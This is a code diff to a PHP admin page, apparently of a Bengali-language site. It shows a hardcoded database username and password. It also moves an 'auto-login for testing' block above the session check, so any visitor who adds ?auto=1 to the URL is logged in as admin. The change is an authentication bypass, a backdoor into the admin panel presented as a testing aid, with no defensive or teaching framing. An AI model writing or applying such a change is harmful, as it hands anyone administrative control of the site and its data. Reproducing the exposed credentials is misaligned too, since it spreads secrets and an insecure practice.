@@ -9,6 +9,11 @@ define('DB_USER', 'scriptbd_scriptbd_user');
 define('DB_PASS', 'Sbd@2026!Pro');
 
 session_start();
+// Auto-login for testing
+if (isset($_GET['auto']) && $_GET['auto'] === '1') {
+    $_SESSION['admin_logged_in'] = true;
+    $_SESSION['admin_username'] = 'admin';
+}
 if (empty($_SESSION['admin_logged_in'])) {
     header('Location: index.php'); exit;
 }
@@ -96,11 +101,7 @@ function ago($d) {
     if($df<86400) return floor($df/3600).'ঘ'; return floor($df/86400).'দিন';
 }
 
-// Quick action: login with ?auto=admin:admin123
-if (isset($_GET['auto']) && $_GET['auto'] === '1') {
-    $_SESSION['admin_logged_in'] = true;
-    $_SESSION['admin_username'] = 'admin';
-}
+// Auto-login handled at top
 ?>
 <!DOCTYPE html>
 <html lang="bn">
